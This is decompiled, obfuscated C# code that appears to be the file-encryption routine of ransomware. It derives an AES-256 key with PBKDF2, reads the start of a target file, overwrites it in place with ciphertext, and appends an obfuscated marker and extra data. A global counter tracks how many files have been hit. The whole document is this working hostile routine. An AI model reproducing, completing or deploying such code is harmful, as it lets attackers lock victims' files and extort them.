using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace eltZnUpwRizyZ;

public static class ujXrqFZLIuhev
{
	[NonSerialized]
	internal static GetString _000E;

	public static byte[] jsetmJbXIvBqD(byte[] P_0, byte[] P_1, byte[] P_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = KJrEwJybgsN(P_1, P_2);
		P_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(P_0, 0, P_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes KJrEwJybgsN(byte[] P_0, byte[] P_1)
	{
		return new Rfc2898DeriveBytes(P_0, P_1, 52768);
	}

	public static byte[] mYXsIDdSmNYSk(string P_0, int P_1)
	{
		byte[] array = new byte[P_1];
		try
		{
			if (OPwDdsoVlNU.TMMTTmWVJnveZ == _000E(107396885))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(P_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, P_1);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(P_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, P_1);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (OPwDdsoVlNU.QCmKQKwvWBrFEj)
			{
				try
				{
					File.AppendAllText(OPwDdsoVlNU.hBPcxbXfrBbYZwL, _000E(107385638) + P_0 + _000E(107399955) + ex.Message + _000E(107396254));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(P_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, P_1);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool qervcdxCETqmk(string JZMrFIOjlmFGmC, byte[] hgtQklihbol, byte[] LtdxxvPkxj = null)
	{
		try
		{
			byte[] array = null;
			if (OPwDdsoVlNU.TMMTTmWVJnveZ == _000E(107396885))
			{
				array = (OPwDdsoVlNU.OmLPyoScyL ? Encoding.ASCII.GetBytes(OPwDdsoVlNU.KsnoBrbTQSaN(OPwDdsoVlNU.iNAczKOivbE) + OPwDdsoVlNU.KsnoBrbTQSaN(_000E(107399897)) + Convert.ToString(OPwDdsoVlNU.phsLIEBLTPR) + OPwDdsoVlNU.KsnoBrbTQSaN(_000E(107399897))) : Encoding.ASCII.GetBytes(OPwDdsoVlNU.KsnoBrbTQSaN(OPwDdsoVlNU.iNAczKOivbE) + OPwDdsoVlNU.KsnoBrbTQSaN(_000E(107399874)) + Convert.ToString(OPwDdsoVlNU.phsLIEBLTPR) + OPwDdsoVlNU.KsnoBrbTQSaN(_000E(107399874))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(JZMrFIOjlmFGmC, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(hgtQklihbol, 0, hgtQklihbol.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(JZMrFIOjlmFGmC, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!OPwDdsoVlNU.OmLPyoScyL)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(LtdxxvPkxj, 0, LtdxxvPkxj.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (OPwDdsoVlNU.OmLPyoScyL ? Encoding.ASCII.GetBytes(OPwDdsoVlNU.KsnoBrbTQSaN(OPwDdsoVlNU.iNAczKOivbE) + OPwDdsoVlNU.KsnoBrbTQSaN(_000E(107399897)) + Convert.ToString(OPwDdsoVlNU.phsLIEBLTPR) + OPwDdsoVlNU.KsnoBrbTQSaN(_000E(107399897))) : Encoding.ASCII.GetBytes(OPwDdsoVlNU.KsnoBrbTQSaN(OPwDdsoVlNU.iNAczKOivbE) + OPwDdsoVlNU.KsnoBrbTQSaN(_000E(107399874)) + Convert.ToString(OPwDdsoVlNU.phsLIEBLTPR) + OPwDdsoVlNU.KsnoBrbTQSaN(_000E(107399874))));
				FileStream fileStream2 = new FileStream(JZMrFIOjlmFGmC, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(hgtQklihbol, 0, hgtQklihbol.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(JZMrFIOjlmFGmC, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!OPwDdsoVlNU.OmLPyoScyL)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(LtdxxvPkxj, 0, LtdxxvPkxj.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			OPwDdsoVlNU.JSBuxhHRYzkt++;
		}
		catch (Exception ex)
		{
			if (OPwDdsoVlNU.QCmKQKwvWBrFEj)
			{
				try
				{
					File.AppendAllText(OPwDdsoVlNU.hBPcxbXfrBbYZwL, _000E(107385638) + JZMrFIOjlmFGmC + _000E(107399888) + ex.Message + _000E(107396254));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (OPwDdsoVlNU.OmLPyoScyL ? Encoding.ASCII.GetBytes(OPwDdsoVlNU.KsnoBrbTQSaN(OPwDdsoVlNU.iNAczKOivbE) + OPwDdsoVlNU.KsnoBrbTQSaN(_000E(107399897)) + Convert.ToString(OPwDdsoVlNU.phsLIEBLTPR) + OPwDdsoVlNU.KsnoBrbTQSaN(_000E(107399897))) : Encoding.ASCII.GetBytes(OPwDdsoVlNU.KsnoBrbTQSaN(OPwDdsoVlNU.iNAczKOivbE) + OPwDdsoVlNU.KsnoBrbTQSaN(_000E(107399874)) + Convert.ToString(OPwDdsoVlNU.phsLIEBLTPR) + OPwDdsoVlNU.KsnoBrbTQSaN(_000E(107399874))));
				FileStream fileStream4 = new FileStream(JZMrFIOjlmFGmC, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(hgtQklihbol, 0, hgtQklihbol.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(JZMrFIOjlmFGmC, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!OPwDdsoVlNU.OmLPyoScyL)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(LtdxxvPkxj, 0, LtdxxvPkxj.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static ujXrqFZLIuhev()
	{
		Strings.CreateGetStringDelegate(typeof(ujXrqFZLIuhev));
	}
}
